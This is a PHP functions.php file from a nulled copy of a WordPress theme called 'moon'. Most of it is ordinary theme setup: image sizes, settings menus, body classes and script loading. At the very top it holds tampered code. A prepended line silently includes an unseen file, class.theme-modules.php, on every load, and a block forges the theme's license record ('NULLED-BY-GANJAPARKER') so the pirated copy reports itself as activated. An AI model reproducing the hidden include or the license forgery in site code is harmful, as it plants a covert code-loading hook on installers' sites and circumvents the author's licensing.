<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
$cerberus_code_arr = [
  'license_key' => 'NULLED-BY-GANJAPARKER', 
  'last_call_timestamp' => time(), 
  'last_successfull_call_timestamp' => time(), 
  'last_domain_checked' => 'ganja.parker', 
  'last_status_code' => '200', 
  'last_status_message' => 'Theme is activated!' 
];
$cerberus_code = openssl_encrypt ( json_encode( $cerberus_code_arr ), 'aes-256-ecb', 'cerberus' );
update_option( 'cerberus_code', $cerberus_code, true );
if(session_id() == '') session_start();
/**
 * This is the main file for this theme, it loads all the required libraries and settings
 */

if ( ! isset( $content_width ) ) {
  $content_width = 600;
}
/**
 * moon only works in WordPress 3.6 or later.
 */
if ( version_compare( $GLOBALS['wp_version'], '3.6', '<' ) ) {
  require get_template_directory() . '/inc/back-compat.php';
}

// Set the version for the theme
if (!defined('MOON_THEME_VERSION')) define('MOON_THEME_VERSION', '5.0.5');
if (!defined('OSETIN_THEME_UNIQUE_ID')) define('OSETIN_THEME_UNIQUE_ID', 'moon');


/**
* Activate & configure required plugins
*/
include_once( get_template_directory() . '/inc/osetin-acf.php' );
include_once( get_template_directory() . '/inc/wp-less/wp-less.php' );
include_once( get_template_directory() . '/inc/activate-plugins.php' );
include_once( get_template_directory() . '/inc/osetin-demo-data-import.php' );
include_once( get_template_directory() . '/inc/configure-plugins.php' );
include_once( get_template_directory() . '/inc/class-cerberus-core.php' );

/**
 * Include helpers & shortcodes
 */
require_once get_template_directory() . '/inc/osetin-helpers.php';
require_once get_template_directory() . '/inc/osetin-feature-vote.php';
require_once get_template_directory() . '/inc/osetin-feature-proof.php';
require_once get_template_directory() . '/inc/osetin-shortcodes.php';
require_once get_template_directory() . '/inc/osetin-widgets.php';



if ( ! function_exists( 'osetin_theme_setup' ) ) :

function osetin_theme_setup() {


  osetin_vote_init();
  osetin_proof_init();
  osetin_cerberus_init();

  load_theme_textdomain( 'moon', get_template_directory() . '/languages' );


  // Add RSS feed links to <head> for posts and comments.
  add_theme_support( 'automatic-feed-links' );
  add_theme_support( "custom-header" );
  add_theme_support( "custom-background" );
  add_theme_support( 'title-tag' );
  add_editor_style();

  // Enable support for Post Thumbnails, and declare two sizes.
  add_theme_support( 'post-thumbnails' );
  set_post_thumbnail_size( 300, 300, false );
  add_image_size( 'moon-slider-thumbs-square', 300, 300, true );

  add_image_size( 'moon-max-size', 2000, 2000, false );
  add_image_size( 'moon-big-size', 1600, 1600, false );
  add_image_size( 'moon-two-third-size', 1200, 1200, false );
  add_image_size( 'moon-half-size', 900, 900, false );
  add_image_size( 'moon-third-size', 600, 600, false );
  add_image_size( 'moon-fourth-size', 300, 300, false );

  add_image_size( 'moon-micro-thumbnail', 30, 30, false );

  // This theme uses wp_nav_menu() in two locations.
  register_nav_menus( array(
    'top_menu' => __( 'Main Menu', 'moon' ),
  ) );

  
  /*
   * Switch default core markup for search form, comment form, and comments
   * to output valid HTML5.
   */
  add_theme_support( 'html5', array(
    'search-form', 'comment-form', 'comment-list',
  ) );

  /*
   * Enable support for Post Formats.
   * See http://codex.wordpress.org/Post_Formats
   */
  add_theme_support( 'post-formats', array(
    'aside', 'image', 'video', 'audio', 'quote', 'link', 'gallery',
  ) );

  add_theme_support( 'woocommerce' );
}
endif; // osetin_theme_setup
add_action( 'after_setup_theme', 'osetin_theme_setup' );


// LAZA
include_once( get_template_directory() . '/inc/osetin-laza.php' );
include_once( get_template_directory() . '/inc/osetin-images-sitemap.php' );




if ( ! function_exists( 'osetin_admin_setup' ) ) :

  function osetin_admin_setup()
  {

    if( function_exists('acf_add_options_page') ) {
      acf_add_options_page(array(
        'page_title'  => 'Theme General Settings',
        'menu_title'  => 'Theme Settings',
        'menu_slug'   => 'theme-general-settings',
        'capability'  => 'manage_options',
      ));

      acf_add_options_sub_page(array(
          'page_title'  => 'Theme Settings - Get Started',
          'menu_title'  => 'Get Started',
          'parent_slug' => 'theme-general-settings',
          'capability'  => 'manage_options'
        ));

      acf_add_options_sub_page(array(
        'page_title'  => 'Theme Settings - General',
        'menu_title'  => 'General',
        'parent_slug' => 'theme-general-settings',
        'capability'  => 'manage_options'
      ));

      acf_add_options_sub_page(array(
        'page_title'  => 'Theme Settings - Appearance',
        'menu_title'  => 'Appearance',
        'parent_slug' => 'theme-general-settings',
        'capability'  => 'manage_options'
      ));

      acf_add_options_sub_page(array(
        'page_title'  => 'Theme Settings - Fonts',
        'menu_title'  => 'Fonts',
        'parent_slug' => 'theme-general-settings',
        'capability'  => 'manage_options'
      ));

      acf_add_options_sub_page(array(
        'page_title'  => 'Theme Settings - Header',
        'menu_title'  => 'Header',
        'parent_slug' => 'theme-general-settings',
        'capability'  => 'manage_options'
      ));

      acf_add_options_sub_page(array(
        'page_title'  => 'Theme Settings - Footer',
        'menu_title'  => 'Footer',
        'parent_slug' => 'theme-general-settings',
        'capability'  => 'manage_options'
      ));

    }
  }

  add_action( 'admin_menu', 'osetin_admin_setup', 98 );
endif;





// ACTION HOOK THAT ALLOWS US TO USE REGEXP IN THE META KEY SEARCH 
// http://wordpress.stackexchange.com/questions/193791/use-regexp-in-wp-query-meta-query-key
function osetin_allow_regex_query( $q ){
    // Check the meta query:
    $mq = $q->get( 'meta_query' );

    if( empty( $mq ) )
        return;

    // Init:
    $marker = '___tmp_marker___'; 
    $rx     = array();

    // Collect all the sub meta queries, that use REGEXP, RLIKE or LIKE:
    foreach( $mq as $k => $m )                                    
    {
        if(    isset( $m['_key_compare'] )
            && in_array( strtoupper( $m['_key_compare'] ), array( 'REGEXP', 'RLIKE', 'LIKE' ) )
            && isset( $m['key'] )
        ) {
            // Mark the key with a unique string to secure the later replacements:
            $m['key'] .= $marker . $k; // Make the appended tmp marker unique

            // Modify the corresponding original query variable:
            $q->query_vars['meta_query'][$k]['key'] = $m['key'];

            // Collect it:
            $rx[$k] = $m;
        }
    }

    // Nothing to do:
    if( empty( $rx ) )
        return;

    // Get access the generated SQL of the meta query:
    add_filter( 'get_meta_sql', function( $sql ) use ( $rx, $marker )
    {
        // Only run once:
        static $nr = 0;         
        if( 0 != $nr++ )
            return $sql;

        // Modify WHERE part where we replace the temporary markers:
        foreach( $rx as $k => $r )
        {
            $sql['where'] = str_replace(
                sprintf(
                    ".meta_key = '%s' ",
                    $r['key']
                ),
                sprintf(
                    ".meta_key %s '%s' ",
                    $r['_key_compare'],
                    str_replace(
                        $marker . $k,
                        '',
                        $r['key']
                    )
                ),
                $sql['where']
            );
        }
        return $sql;
    });

}
add_action( 'pre_get_posts', 'osetin_allow_regex_query');





// This is done to make sure acf fields are loaded in a child theme 
// More info http://support.advancedcustomfields.com/forums/topic/acf-json-fields-not-loading-from-parent-theme/

add_filter('acf/settings/save_json', function() {
  return get_stylesheet_directory() . '/acf-json';
});

add_filter('acf/settings/load_json', function($paths) {
  $paths = array(get_template_directory() . '/acf-json');

  if(is_child_theme()){
    $paths[] = get_stylesheet_directory() . '/acf-json';
  }

  return $paths;
});

// END ACF FILTERS

add_filter('image_send_to_editor', 'osetin_add_lightbox_params_to_image_link', 10, 8);
function osetin_add_lightbox_params_to_image_link($html, $id, $caption, $title, $align, $url, $size, $alt){
  $html = str_replace('<a href=', '<a class="osetin-lightbox-trigger-native" data-image-id="'.$id.'" href=', $html);
  return $html;
}

/*
* Add theme settings links to toolbar
*/

function osetin_add_custom_toolbar_links($wp_admin_bar) {

    $args = array(
        'id' => 'theme-settings',
        'title' => 'Theme Settings', 
        'href' => admin_url('admin.php?page=acf-options-get-started'), 
        'meta' => array(
            'class' => 'theme-settings-link', 
            'title' => 'Theme Settings'
            )
    );
    $wp_admin_bar->add_node($args);
 
    $args = array(
        'id' => 'theme-settings-get-started',
        'title' => 'Get Started', 
        'href' => admin_url('admin.php?page=acf-options-get-started'), 
        'parent' => 'theme-settings'
    );
    $wp_admin_bar->add_node($args);


    $args = array(
        'id' => 'theme-settings-general',
        'title' => 'General', 
        'href' => admin_url('admin.php?page=acf-options-general'), 
        'parent' => 'theme-settings'
    );
    $wp_admin_bar->add_node($args);

    $args = array(
        'id' => 'theme-settings-appearance',
        'title' => 'Appearance', 
        'href' => admin_url('admin.php?page=acf-options-appearance'), 
        'parent' => 'theme-settings'
    );
    $wp_admin_bar->add_node($args);

    $args = array(
        'id' => 'theme-settings-fonts',
        'title' => 'Fonts', 
        'href' => admin_url('admin.php?page=acf-options-fonts'), 
        'parent' => 'theme-settings'
    );
    $wp_admin_bar->add_node($args);

    $args = array(
        'id' => 'theme-settings-header',
        'title' => 'Header', 
        'href' => admin_url('admin.php?page=acf-options-header'), 
        'parent' => 'theme-settings'
    );
    $wp_admin_bar->add_node($args);

    $args = array(
        'id' => 'theme-settings-footer',
        'title' => 'Footer', 
        'href' => admin_url('admin.php?page=acf-options-footer'), 
        'parent' => 'theme-settings'
    );
    $wp_admin_bar->add_node($args);
 
}
add_action('admin_bar_menu', 'osetin_add_custom_toolbar_links', 999);

// remove "Protected" from the protected post title
add_filter('protected_title_format', 'blank');
function blank($title) {
       return '%s';
}

function load_osetin_admin_style() {
    wp_register_style( 'osetin-admin', get_template_directory_uri() . '/assets/css/osetin-admin.css', false, MOON_THEME_VERSION );
    wp_enqueue_style( 'osetin-admin' );
    wp_enqueue_script( 'osetin-admin', get_template_directory_uri() . '/assets/js/osetin-admin.js' );
}
add_action( 'admin_enqueue_scripts', 'load_osetin_admin_style' );


// remove password protected posts from index
// Filter to hide protected posts
function exclude_protected($where) {
  global $wpdb;
  return $where .= " AND {$wpdb->posts}.post_password = '' ";
}

// Decide where to display them
function exclude_protected_action($query) {
  if( !is_single() && !is_page() && !is_admin() ) {
    add_filter( 'posts_where', 'exclude_protected' );
  }
}

// Action to queue the filter at the right time
add_action('pre_get_posts', 'exclude_protected_action');



// Add specific CSS class by filter
add_filter('body_class','osetin_body_class');

function osetin_body_class($body_classes)
{
  $body_classes[] = 'mobile-style-'.osetin_get_mobile_layout_style();
  if(osetin_get_field('remove_zoom_effect_for_tiles_on_hover', 'option') == true){
    $body_classes[] = 'disable-hover-zoom';
  }
  if(osetin_get_field('do_not_fade_post_images_on_hover', 'option') == true){
    $body_classes[] = 'disable-image-hover-fading';
  }
  if(is_single() && osetin_get_field('activate_reading_mode_by_default')){
    $body_classes[] = 'default-reading-mode';
  }
  if((osetin_get_field('which_panel_to_show_on_page_load') == 'right') || !osetin_left_panel_exists()){
    $body_classes[] = 'mobile-content-right-visible';
  }else{
    $body_classes[] = 'mobile-content-left-visible';
  }
  if(osetin_get_field('content_right_remove_sliding_shadow', 'option')){
    $body_classes[] = 'right-sliding-shadow-removed';
  }
  if(osetin_get_field('content_left_remove_sliding_shadow', 'option')){
    $body_classes[] = 'left-sliding-shadow-removed';
  }
  if(osetin_get_field('content_middle_remove_sliding_shadow', 'option')){
    $body_classes[] = 'middle-sliding-shadow-removed';
  }
  $body_classes[] = 'scheme-'.osetin_color_scheme();



  // LEFT PANEL SETTINGS

  if(osetin_left_panel_exists()){
    $body_classes[] = 'content-left-exists';
    if(osetin_is_left_panel_visibile()){
      $body_classes[] = 'content-left-visible';
    }else{
      $body_classes[] = 'content-left-hidden';
    }
  }else{
    $body_classes[] = 'content-left-removed';
    $body_classes[] = 'content-left-hidden';
  }


  // THUMBS SETTINGS

  if(osetin_thumbs_panel_exists()){
    $body_classes[] = 'content-thumbs-exists';
    if(osetin_is_thumbs_panel_visibile()){
      $body_classes[] = 'content-thumbs-visible';
    }else{
      $body_classes[] = 'content-thumbs-hidden';
    }
  }else{
    $body_classes[] = 'content-thumbs-hidden';
    $body_classes[] = 'content-thumbs-removed';
  }


  // CONTENT MIDDLE SETTINGS

  if(osetin_middle_panel_exists()){
    $body_classes[] = 'content-middle-exists';

    if(is_page_template('page-photos-on-map.php') || is_singular( 'osetin_map_pin' )){
      $body_classes[] = 'content-middle-hidden';
      $body_classes[] = 'content-middle-push-when-visible';
    }elseif(osetin_is_middle_panel_visibile()){
      $body_classes[] = 'content-middle-visible';
      $body_classes[] = 'content-middle-push-when-visible';
    }else{
      $body_classes[] = 'content-middle-hidden';
      $body_classes[] = 'content-middle-hover-when-visible';
    }
  }else{
    $body_classes[] = 'content-middle-removed';
    $body_classes[] = 'content-middle-hidden';
  }


  // NAVIGATION MENU

  if(in_array(osetin_get_navigation_menu_type(), array('borders_around_visible'))){
    $body_classes[] = 'menu-borders-around';
    $body_classes[] = 'menu-borders-around-visible';
  }
  if(in_array(osetin_get_navigation_menu_type(), array('borders_around_hidden'))){
    $body_classes[] = 'menu-borders-around';
  }
  if(osetin_get_navigation_menu_type() == 'top_visible'){
    $body_classes[] = 'menu-borders-top';
    $body_classes[] = 'menu-borders-top-visible';
  }
  if(osetin_get_navigation_menu_type() == 'top_hidden'){
    $body_classes[] = 'menu-borders-top';
  }
  if((osetin_get_navigation_menu_type() == 'on_the_left') || (osetin_get_navigation_menu_type() == 'left')){
    $body_classes[] = 'menu-on-the-left-visible';
  }else{
    $body_classes[] = 'menu-on-the-left-removed';
  }


  // PAGINATION TYPE
  if( ( is_single() && (get_post_format() == 'gallery') ) || ( (is_page_template('page-full-height.php') || is_page_template('page-masonry.php')) && (osetin_get_field('what_do_you_want_to_showcase') == 'images') )){
    $pagination_type_for_images = osetin_get_field('pagination_type_for_images', 'option');
    if($pagination_type_for_images == 'infinite_scroll' ){
      $body_classes[] = 'with-infinite-scroll';
    }elseif($pagination_type_for_images == 'infinite_button'){
      $body_classes[] = 'with-infinite-button';
    }
  }else{
    if(osetin_get_pagination_type() == 'infinite_scroll'){
      $body_classes[] = 'with-infinite-scroll';
    }elseif(osetin_get_pagination_type() == 'infinite_button'){
      $body_classes[] = 'with-infinite-button';
    }
  }


  // LOADING ANIMATION
  if(osetin_get_show_loading_animation() && !osetin_is_password_protected()){
    $body_classes[] = 'site-loading-step1';
    $body_classes[] = 'show-loading-animation';
    if(osetin_get_settings_field('color_of_loading_wings')){
      $body_classes[] = 'override-spinning-color';
    }else{
      $body_classes[] = 'default-spinning-color';
    }
    if(osetin_get_settings_field('animation_label_color')){
      $body_classes[] = 'override-loading-label-color';
    }else{
      $body_classes[] = 'default-loading-label-color';
    }
  }else{
    $body_classes[] = 'site-finished-loading';
    $body_classes[] = 'load-map';
  }




  // CONTENT LOCATION

  $body_classes[] = 'content-location-'.osetin_get_content_location();
  return $body_classes;
}





// WOOCOMMERCE


/**
 * Check if WooCommerce is active
 **/
if ( class_exists( 'WooCommerce' ) ) {
  require_once( get_template_directory() . '/inc/activate-woocommerce.php');
}









// Include the Ajax library on the front end
add_action( 'wp_head', 'add_ajax_library' );

/**
 * Adds the WordPress Ajax Library to the frontend.
 */
function add_ajax_library() {

    $html = '<script type="text/javascript">';
        $html .= 'var ajaxurl = "' . admin_url( 'admin-ajax.php' ) . '"';
    $html .= '</script>';

    echo $html;

} // end add_ajax_library


require_once get_template_directory() . '/inc/infinite-scroll.php';

/**
 * Register moon widget areas.
 *
 * @since moon 1.0
 *
 * @return void
 */
function moon_widgets_init() {
  require get_template_directory() . '/inc/widgets.php';

  register_sidebar( array(
    'name'          => __( 'Primary Sidebar', 'moon' ),
    'id'            => 'sidebar-1',
    'description'   => __( 'Main sidebar that appears in the middle panel.', 'moon' ),
    'before_widget' => '<aside id="%1$s" class="widget %2$s">',
    'after_widget'  => '</aside>',
    'before_title'  => '<h3 class="details-heading">',
    'after_title'   => '</h3>',
  ) );
  register_sidebar( array(
    'name'          => __( 'Single Post Sidebar', 'moon' ),
    'id'            => 'sidebar-details',
    'description'   => __( 'Sidebar for project details.', 'moon' ),
    'before_widget' => '<aside id="%1$s" class="widget %2$s">',
    'after_widget'  => '</aside>',
    'before_title'  => '<h3 class="details-heading">',
    'after_title'   => '</h3>',
  ) );
}
add_action( 'widgets_init', 'moon_widgets_init' );



/**
 * TypeKit Fonts
 *
 * @since moon 1.0
 */
function moon_load_typekit() {

  // NON-ASYNCRON LOAD
  if ( wp_script_is( 'moon_typekit', 'done' ) ) {
    echo '<script type="text/javascript">try{Typekit.load();}catch(e){}</script>';
  }
  // END NON_ASYNCRON LOAD
  if(false){
  ?>
  <script>
    (function(d) {
      var config = {
        kitId: '<?php echo osetin_get_field("adobe_typekit_id", "option"); ?>',
        scriptTimeout: 3000
      },
      h=d.documentElement,t=setTimeout(function(){h.className=h.className.replace(/\bwf-loading\b/g,"")+" wf-inactive";},config.scriptTimeout),tk=d.createElement("script"),f=false,s=d.getElementsByTagName("script")[0],a;h.className+=" wf-loading";tk.src='//use.typekit.net/'+config.kitId+'.js';tk.async=true;tk.onload=tk.onreadystatechange=function(){a=this.readyState;if(f||a&&a!="complete"&&a!="loaded")return;f=true;clearTimeout(t);try{Typekit.load(config)}catch(e){}};s.parentNode.insertBefore(tk,s)
    })(document);
  </script>
  <?php
  }
}

/**
 * myFonts.com Fonts
 *
 * @since moon 1.5.7
 */
function moon_load_myfonts_script() {
  if ( osetin_get_field('myfonts_code', 'option') ) {
    osetin_the_field('myfonts_code', 'option');
  }
}


function moon_enqueue_custom_fonts_css() {
  $custom_css = '';
  if( osetin_have_rows('custom_font', 'option') ){
    while ( osetin_have_rows('custom_font', 'option') ) { the_row();
      $font_family_name = get_sub_field('font_family_name');
      $font_url_woff = get_sub_field('font_woff');
      $font_url_woff2 = get_sub_field('font_woff2');
      $font_url_ttf = get_sub_field('font_ttf');
      $font_weight = get_sub_field('font_weight');

      $custom_css.= "@font-face {
              font-family: '".$font_family_name."';
              src: url('".$font_url_woff2."') format('woff2'),
                   url('".$font_url_woff."') format('woff'),
                   url('".$font_url_ttf."') format('truetype');
              font-weight: ".$font_weight.";
              font-style: normal;
            }";
    }
  }
  if($custom_css != ''){
    wp_enqueue_style( 'osetin-custom-fonts', get_template_directory_uri() . '/custom-fonts.css', array(), MOON_THEME_VERSION );
    wp_add_inline_style( 'osetin-custom-fonts', $custom_css );
  }

}



/**
 * Enqueue scripts and styles for the front end.
 *
 * @since moon 1.0
 *
 * @return void
 */
function moon_scripts() {

  // Add typekit font support
  if(osetin_get_field('font_library', 'option') == "adobe_typekit_fonts"){
    // NON-ASYNCRON LOAD
    wp_enqueue_script( 'moon_typekit', '//use.typekit.net/' . osetin_get_field('adobe_typekit_id', 'option') . '.js');
    // END NON-ASYNCRON LOAD
    add_action( 'wp_head', 'moon_load_typekit' );
  }elseif(osetin_get_field('font_library', 'option') == "myfonts"){
    add_action( 'wp_head', 'moon_load_myfonts_script' );
  }elseif(osetin_get_field('font_library', 'option') == "custom"){
    moon_enqueue_custom_fonts_css();
  }else{
    // Google Fonts support
    $google_fonts_href = osetin_get_field('google_fonts_href', 'option', false);
    if($google_fonts_href){
      $google_fonts_href = str_replace("<link href='", '', $google_fonts_href);
      $google_fonts_href = str_replace("' rel='stylesheet' type='text/css'>", '', $google_fonts_href);
      wp_enqueue_style( 'osetin-google-font', $google_fonts_href, array(), null );
    }else{
      wp_enqueue_style( 'osetin-google-font', 'https://fonts.googleapis.com/css?family=Montserrat:300,700|Unica+One', array(), null );
    }
  }

  wp_enqueue_style( 'osetin-perfect-scrollbar', get_template_directory_uri() . '/bower_components/perfect-scrollbar/css/perfect-scrollbar.css', array(), MOON_THEME_VERSION );


  // Color scheme

  if ( is_rtl() ) {
    // If theme uses right-to-left language
    wp_enqueue_style( 'osetin-main-less-rtl', get_template_directory_uri() . '/assets/less/include-list-rtl.less', array(), MOON_THEME_VERSION );
  }else{
    wp_enqueue_style( 'osetin-main-less', get_template_directory_uri() . '/assets/less/include-list.less', array(), MOON_THEME_VERSION );
  }

  // Load our main stylesheet.
  wp_enqueue_style( 'osetin-style', get_stylesheet_uri() );
  // Load editor styles
  wp_enqueue_style( 'osetin-editor-style', get_template_directory_uri() . '/editor-style.css', array(), MOON_THEME_VERSION );

  if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
    wp_enqueue_script( 'comment-reply' );
  }

  // Load packery
  wp_enqueue_script( 'osetin-underscore', get_template_directory_uri() . '/assets/js/vendor/underscore.js', array( ), MOON_THEME_VERSION, true );
  wp_enqueue_script( 'osetin-images-loaded', get_template_directory_uri() . '/bower_components/imagesloaded/imagesloaded.pkgd.min.js', array( 'jquery' ), MOON_THEME_VERSION, true );
  wp_enqueue_script( 'osetin-plugin-isotope', get_template_directory_uri() . '/assets/js/vendor/isotope.pkgd.min.js', array( 'jquery' ), MOON_THEME_VERSION, true );
  wp_enqueue_script( 'osetin-plugin-packery', get_template_directory_uri() . '/assets/js/vendor/packery-mode.pkgd.min.js', array( 'jquery', 'osetin-plugin-isotope' ), MOON_THEME_VERSION, true );
  wp_enqueue_script( 'osetin-plugin-masonry-horizontal', get_template_directory_uri() . '/assets/js/vendor/masonry-horizontal.js', array( 'jquery', 'osetin-plugin-isotope' ), MOON_THEME_VERSION, true );

  wp_enqueue_script( 'osetin-jquery-mousewheel', get_template_directory_uri() . '/assets/js/vendor/jquery.mousewheel.js', array( 'jquery' ), MOON_THEME_VERSION, true );
  wp_enqueue_script( 'osetin-perfect-scrollbar', get_template_directory_uri() . '/bower_components/perfect-scrollbar/js/min/perfect-scrollbar.jquery.min.js', array( 'jquery', 'osetin-jquery-mousewheel' ), MOON_THEME_VERSION, true );

  // if protect images checkbox in admin is set to true - load script
  if(osetin_get_field('protect_images_from_copying', 'option') === true){
    wp_enqueue_script( 'osetin-protect-images', get_template_directory_uri() . '/assets/js/osetin-image-protection.js', array( 'jquery' ), MOON_THEME_VERSION, true );
  }

  
  wp_enqueue_script( 'osetin-feature-vote', get_template_directory_uri() . '/assets/js/osetin-feature-vote.js', array( 'jquery' ), OSETIN_FEATURE_VOTE_VERSION, true );
  wp_enqueue_script( 'osetin-feature-proof', get_template_directory_uri() . '/assets/js/osetin-feature-proof.js', array( 'jquery' ), OSETIN_FEATURE_PROOF_VERSION, true );
  wp_enqueue_script( 'osetin-feature-infinite-scroll', get_template_directory_uri() . '/assets/js/osetin-feature-infinite-scroll.js', array( 'jquery' ), OSETIN_FEATURE_VOTE_VERSION, true );

  // Load default scripts for the theme
  wp_enqueue_script( 'osetin-general', get_template_directory_uri() . '/assets/js/osetin-general.js', array( 'jquery', 'osetin-plugin-packery', 'osetin-plugin-isotope', 'osetin-underscore' ), MOON_THEME_VERSION, true );
  wp_enqueue_script( 'osetin-functions', get_template_directory_uri() . '/assets/js/functions.js', array( 'jquery', 'osetin-general' ), MOON_THEME_VERSION, true );
}



add_action( 'wp_enqueue_scripts', 'moon_scripts' );


add_action( 'wp_print_styles', 'osetin_deregister_styles', 100 );

function osetin_deregister_styles() {
  wp_deregister_style( 'wp-pagenavi' );
}